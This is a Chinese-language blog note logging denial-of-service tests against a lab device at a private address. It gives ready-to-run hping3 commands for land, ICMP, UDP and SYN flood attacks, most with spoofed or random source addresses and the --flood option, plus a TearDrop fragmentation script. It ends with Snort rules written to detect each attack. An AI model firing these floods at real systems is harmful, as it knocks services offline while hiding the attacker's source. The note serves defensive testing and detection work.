---
title: "Hping3攻击测试DDOS"
date: 2023-09-15T20:27:33+08:00
draft: false
tags: ["ddos", "hping3", "synflood"]
categories: ["笔记"]
author: "dcq"

contentCopyright: '<a rel="license noopener" href="https://en.wikipedia.org/wiki/Wikipedia:Text_of_Creative_Commons_Attribution-ShareAlike_3.0_Unported_License" target="_blank">Creative Commons Attribution-ShareAlike License</a>'
---

#### 1. 攻击工具

1. hping3: 是用于生成和解析TCPIP协议数据包的开源工具。

2. 攻击机器：192.168.200.178

3. 被攻击机器：
   
   1. 设备名称：激光发送端
   
   2. 设备ip: 192.168.200.107

#### 2. 抓包工具

1. Tcpdump

2. 抓包脚本
   
   ```shell
   $sudo tcpdump -i enp4s0 port 443 -n
   ```

#### 3. 攻击脚本

1. land攻击
   
   > 攻击者发送SYN报文的源地址和目标地址同为被攻击者的IP地址，导致被攻击者向其自己的地址发送SYN-ACK消息，使被攻击者主机存在大量空连接。不同被攻击者对Land攻击反应不同，UNIX主机将崩溃，Windows NT主机的运行状态会变的极其缓慢。
   
   ```shell
   $hping -V -c 100 -d 40 -S -p 139 -s 80 -k -a 192.168.200.107 ...
   -S：设置SYN flag标志位为1，即发送SYN报文；
   
   -p 445：被攻击的目标端口 TCP 445；
   
   192.168.200.107：被攻击的目标地址；
   
   -a 192.168.200.107：被攻击者的IP源地址；
   
   -c 10：仅发送攻击报文10个；
   
   --fast： alias for -i u10000 (10 packets for second)；
   
   --faster：alias for -i u1000 (100 packets for second)；
   -d 500 设置TCP playload为500字节
   --flood：sent packets as fast as possible. Don't show replies；
   sudo hping3 -d 500 -S -p 445 192.168.254.3 -a 192.168.254.3 –flood 
   ```

2. TearDrop攻击
   
   1. 攻击脚本
      
      ```shell
      $vim teardrops.sh
      $#!/bin/bash
      
      function teardrop()
      {
          local victim_ip=$1
          local id_begin=$2
          local id_end=$3
      
          for((id=${id_begin}; id<${id_end}; id++))
          do
              hping3 --icmp ${victim_ip} --data 1000 --id ${id} --count 1 --morefrag
              hping3 --icmp ${victim_ip} --data 200 --id ${id} --count 1 --fragoff 400
          done
      }
      
      teardrop $*
      $保存
      ```

3. ICMP Flood 攻击
   
   1. 攻击脚本
      
      ```shell
      #发送icmp报文到192.168.200.107，伪造随机源IP地址，洪水攻击
      $sudo hping3 --icmp 192.168.200.107 --rand-source --flood
      $sudo hping3 --icmp 192.168.200.107
      $sudo hping3 -q -n -d 200 --icmp --flood -a 28.28.28.28 192.168.200.107
      ```

4. UDP Flood 攻击
   
   1. 攻击脚本
      
      ```shell
      # 发送udp报文到192.168.200.107:443
      $sudo hping3 --udp 192.168.200.107 -p 443
      
      # 发送 udp 报文 到 192.168.1.1:443。伪造随机源地址，洪水攻击。
      $sudo hping3 --udp 192.168.200.107 -p 443 --rand-source --flood
      
      $sudo hping3 --udp -s 6666 -p 443 -a 29.29.29.29 --flood 192.168.180.133
      ```

5. SYN Flood 攻击
   
   1. 攻击脚本
      
      ```shell
      # 通过eth1，发送SYN报文到 192.168.200.107:443。伪造源地址为192.168.180.131，时间间隔1000us。
      $ sudo hping3 -I enp4s0 -S 192.168.200.107 -p 443 -a 192.168.180.131 -i u1000
      
      # 通过eth1，发送SYN报文到192.168.200.107:443，伪造随机源地址，时间间隔1000us。
      $sudo hping3 -I enp4s0 -S 192.168.200.107 -p 443 --rand-source -i u1000
      
      # 通过 eth1，发送SYN报文到192.168.200.107:443，伪造随机源地址，洪水攻击。
      # 洪水攻击，速率最快的攻击，不会显示数据和丢包的统计。
      $sudo hping3 -I enp4s0 -S 192.168.200.107 -p 443 --rand-source --flood
      
      $sudo hping3 -c 1000 -d 120 -S -p 443 --flood --rand-source 192.168.180.133
      $sudo hping3 -S -P -U -p 80 --flood --rand-source 192.168.180.133
      
      TCP Flood
      
      $sudo hping3 -SARUPF -p 80 --flood --rand-source 192.168.180.133
      ```

#### 4. snort rules

* 规则/etc/snort/rules/local.rules
  
  ```shell
   alert tcp any any -> any any (msg:"Possible DDOS attack"; flags:S; threshold: type both, track by_src, count 1, seconds 1; sid:100001; rev:1;)
   alert tcp any any -> $HOME_NET any (flags: S; msg:"Possible DoS Attack Type : SYNflood"; flow:stateless; sid:100002; detection_filter:track by_dst, count 10, seconds 3;)
   #TearDrop 攻击
   alert ip any any -> any any (fragoffset:0; fragbits:M; id:2465; msg:"Possible Teardrop attack detected"; sid:100003;)
   alert udp any any -> any any (msg:"Possible TearDrop attack detected!"; dsize: < 64; sid:100004;)
   #ICMP Flood 攻击
   alert icmp any any -> any any (msg:"Possible ICMP Flood attack detected"; threshold: type both, track by_src, count 1, seconds 1; sid:100005; rev:1;)
   alert icmp any any -> $HOME_NET any (msg:"ICMP flood"; sid:100006; rev:1; classtype:icmp-event; detection_filter:track by_dst, count 10, seconds 3;)
   #UDP Flood 攻击
   alert udp any any -> any any (msg:"Possible UDP Flood attack"; threshold: type both, track by_src, count 1, seconds 1; sid:100007; rev:1;)
   #SYN Flood 攻击
   alert tcp any any -> any any (msg:"Possible SYN Flood attack"; flags:S; threshold: type both, track by_src, count 1, seconds 1; sid:100008; rev:1;)
   alert tcp any any -> any any (flags: S; threshold: type both, track by_src, count 100, seconds 10; msg:"Possible SYN Flood Attack"; sid:100009; rev:1;)
  ```
